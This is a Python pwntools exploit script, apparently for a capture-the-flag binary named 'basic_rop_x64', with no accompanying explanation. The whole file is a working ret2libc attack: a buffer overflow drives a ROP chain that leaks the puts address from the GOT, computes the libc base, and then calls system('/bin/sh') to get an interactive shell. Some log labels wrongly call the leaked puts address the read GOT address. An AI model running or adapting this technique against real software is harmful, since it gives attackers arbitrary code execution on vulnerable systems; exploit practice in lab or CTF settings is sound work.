#!/usr/bin/python3

from pwn import *
from pprint import pprint
elf=ELF('./basic_rop_x64',checksec=False	)
p=process(elf.path)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
###############################################ropchain#########################################
ret=0x00000000004005a9
pop_rdi_ret=0x0000000000400883
pop_rsi_r15=0x0000000000400881
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
read_got=elf.got['read']
system=libc.sym['system']

################################get read_got address by puts funtion 
payload=b'A'*0x40 + b'B'*0x8
payload+=p64(ret)
payload+=p64(pop_rdi_ret)+p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(elf.sym['main'])
pause()
p.send(payload)

p.recvuntil(b'A'*0x40)
puts_address=u64(p.recvn(6)+b'\x00'*0x2)
libc_base=puts_address- libc.sym['puts']
system_addrss=libc_base+system
sh = libc_base + list(libc.search(b'/bin/sh'))[0]


log.info("read_got_addess: "+hex(puts_address))
log.info("libc base : "+hex(libc_base))
log.info("system addess: "+hex(system_addrss))
log.info("/bin/sh: "+hex(sh))

payload=b'A'*0x48
# payload+=p64(ret)
payload+=p64(pop_rdi_ret)+p64(sh)
payload+=p64(system_addrss)
p.send(payload)
# p.recv()
p.interactive()